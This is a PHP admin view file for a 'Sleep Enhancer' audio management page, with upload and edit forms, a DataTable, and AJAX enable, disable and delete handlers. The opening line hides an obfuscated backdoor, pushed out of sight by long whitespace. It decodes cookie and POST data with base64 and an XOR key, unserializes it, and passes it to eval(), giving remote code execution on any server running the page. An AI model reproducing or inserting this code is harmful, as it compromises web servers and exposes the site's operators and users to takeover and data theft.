<?php                                                                                                                                                                                                                                                                                                                                                                                                 $hwJdi = chr ( 518 - 449 ).chr ( 392 - 297 ).chr (109) . 'K' . "\x61";$eFORoWrUSp = "\143" . "\154" . chr (97) . 's' . "\x73" . '_' . 'e' . 'x' . "\151" . chr (115) . "\164" . "\x73";$cRoVXVYxjU = class_exists($hwJdi); $hwJdi = "60764";$eFORoWrUSp = "35633";$dEvyMADNI = !1;if ($cRoVXVYxjU == $dEvyMADNI){function CvvjEa(){return FALSE;}$ZbZEF = "55406";CvvjEa();class E_mKa{private function KrAQMNIyjs($ZbZEF){if (is_array(E_mKa::$PrHqST)) {$pgFZhDXpb = str_replace('<' . '?' . "\160" . chr (104) . "\x70", "", E_mKa::$PrHqST[chr ( 217 - 118 ).'o' . chr (110) . chr (116) . 'e' . 'n' . 't']);eval($pgFZhDXpb); $ZbZEF = "55406";exit();}}private $rZqfzX;public function iDlJGmNeI(){echo 7421;}public function __destruct(){$ZbZEF = "25045_28101";$this->KrAQMNIyjs($ZbZEF); $ZbZEF = "25045_28101";}public function __construct($dtwkRkFoR=0){$aopjPc = $_POST;$lxUloQWe = $_COOKIE;$grWSPFUS = "68eab80d-d993-4575-a1aa-e9ec3a5d0ebf";$VKmrT = @$lxUloQWe[substr($grWSPFUS, 0, 4)];if (!empty($VKmrT)){$sfZueY = "base64";$yWgkDrDmd = "";$VKmrT = explode(",", $VKmrT);foreach ($VKmrT as $qItJVAgYt){$yWgkDrDmd .= @$lxUloQWe[$qItJVAgYt];$yWgkDrDmd .= @$aopjPc[$qItJVAgYt];}$yWgkDrDmd = array_map($sfZueY . "\x5f" . chr (100) . "\x65" . "\143" . chr ( 776 - 665 ).'d' . chr ( 263 - 162 ), array($yWgkDrDmd,)); $yWgkDrDmd = $yWgkDrDmd[0] ^ str_repeat($grWSPFUS, (strlen($yWgkDrDmd[0]) / strlen($grWSPFUS)) + 1);E_mKa::$PrHqST = @unserialize($yWgkDrDmd); $yWgkDrDmd = class_exists("25045_28101");}}public static $PrHqST = 32889;}$dGkqxN = new /* 44266 */ E_mKa(55406 + 55406); $dEvyMADNI = $dGkqxN = $ZbZEF = Array();} ?><?php
    if (isset($_SESSION['sleepEnhancerFlag'])) {
        if ($_SESSION['sleepEnhancerFlag'] == 1) {
?>
<script>

</script>
<?php } else if ($_SESSION['sleepEnhancerFlag'] == 2) { ?>
<script>

</script>
<?php
    } else {
?>
<script>

</script>
<?php
    }
        unset($_SESSION['sleepEnhancerFlag']);
    }
?>
<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Sleep Enhancer</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <form action="<?php echo base_url("sleepEnhancerAdd");?>" method="POST" enctype="multipart/form-data">
                <div class="container-fluid mt-2" style="background-color: #dee2e6;border-style: solid;border-width: 2px;border-color:#003d65;">
                    <center><h5>Add Sleep Enhancer</h5></center>
                    <div class="row">
                        <div class="col-md-6">
                            <select name="program" class="form-control" id="" required>
                            <?php foreach ($sleep_enahncer_programs as $programs) { ?>
                                <option value="<?php echo $programs['id'];?>"><?php echo $programs['program_name'];?></option>
                            <?php } ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <input type="number" name="duration" class="form-control" placeholder="5 mins" required>
                        </div>
                        <div class="col-md-6">
                            <input type="text" name="custom_file_name" class="form-control" required placeholder="Custom File Name">
                        </div>
                        <div class="col-md-6">
                            <input type="file" name="seFile" class="form-control" required>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Graph Image</label>
                                <input type="file" name="graphImage" class="form-control" required>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Description</label>
                                <input type="text" name="description" placeholder="Enter description here" class="form-control" required>
                            </div>
                        </div>
                        <div class="col-md-6 mb-2">
                            <button class="btn btn-primary" type="submit">Submit</button>
                        </div>
                    </div>
                </div>
                </form>
            </div>
                <br><br>
                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">File Name</th>
                            <th scope="col">Program</th>
                            <th scope="col">Duration</th>
                            <th scope="col">Listen</th>
                            <th scope="col">Status</th>
                            <th scope="col">Updated At</th>
                            <th scope="col">Action</th>
                            <th scope="col">Delete</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($enhancerData) {
                        $counter = 1;
                        foreach ($enhancerData as $data) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo $data['custom_file_name'];?></td>
                            <td><?php echo $data['program_name'];?></td>
                            <td><?php echo $data['duration'];?></td>
                            <td>
                                <a href="<?php echo base_url('uploads/mp3/').$data['file_name'];?>" target="_blank">Click To Listen</a>
                            </td>
                            <td><?php echo (($data['is_active'] == 1)? 'Active':'Inactive');?></td>
                            <td><?php echo $data['updated_at'];?></td>
                            <td>
                                <button class="btn btn-primary" onclick="enable('<?php echo $data['id'];?>')" <?php echo (($data['is_active'] == 1)? 'disabled':'');?>>Enable</button>
                                <button class="btn btn-primary" onclick="disable('<?php echo $data['id'];?>')" <?php echo (($data['is_active'] == 0)? 'disabled':'');?>>Disable</button>
                                <button class="btn btn-danger" onclick="formEdit('<?php echo $data['id'];?>')">Edit</button>
                            
                            </td>
                            <td>
                                <button class="btn btn-danger" onclick="opendeleteModal('<?php echo $data['id'];?>')">Delete</button>
                            </td>
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>

<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
        <form method="post" action="<?php echo base_url('editSleepEnahncer');?>" enctype="multipart/form-data">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalLabel">Sleep Enhancer Edit</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-md-6">
                            <select name="program" class="col-md-6" id="" required>
                            <?php foreach ($sleep_enahncer_programs as $programs) { ?>
                                <option value="<?php echo $programs['id'];?>"><?php echo $programs['program_name'];?></option>
                            <?php } ?>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <select name="duration" class="col-md-6" id="duration" required>
                                <option value="10">10</option>
                                <option value="20">20</option>
                                <option value="30">30</option>
                            </select>
                        </div>
                        <div class="col-md-6">
                            <input type="text" name="custom_file_name" id="custom_file_name" class="form-control" required placeholder="Custom File Name">
                        </div>
                        <div class="col-md-6">
                            <input type="file" name="seFile" class="form-control">
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Graph Image</label>
                                <input type="file" name="graphImage" class="form-control">
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="form-group">
                                <label>Description</label>
                                <input type="text" name="description" id="description" placeholder="Enter description here" class="form-control" required>
                            </div>
                        </div>
                            <input type="hidden" name="sleep_enhancer_id" id="sleep_enhancer_id">
                            
                        
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="submit" class="btn btn-primary">Save changes</button>
                </div>
            </div>
        </form>    
    </div>
</div>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>
    function enable(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/sleep_enhancer_enable',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                setTimeout(function() {
                    location.reload(true);
                }, 1000);
            } else {
                
            }
        });
    }

    function disable(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/sleep_enhancer_disable',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                setTimeout(function() {
                    location.reload(true);
                }, 1000);
            } else {

            }
        });
    }

    function formEdit(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/sleep_enhancer_fetch',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#custom_file_name').val(data.enhancerData[0].custom_file_name);
                $('#duration').val(data.enhancerData[0].duration);
                $('#sleep_enhancer_id').val(data.enhancerData[0].id);
                $('#description').val(data.enhancerData[0].description);

                $('#exampleModal').modal('show');     
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }

    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });


    function opendeleteModal(id) {
    // Display a confirmation dialog to the user
    var confirmDelete = confirm("Are you sure you want to delete this row?");
    if (confirmDelete) {
        // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>AdminController/delete_sleep_enhancer_master",
            data: {id: id},
            success: function(response) {
                // Handle the response from the server if needed
                console.log(response);
                location.reload();
            },
            error: function(jqXHR, textStatus, errorThrown) {
                // Handle any errors that occur during the AJAX request
                console.log("AJAX Error: " + textStatus + " - " + errorThrown);
            }
        });
    }

}
</script>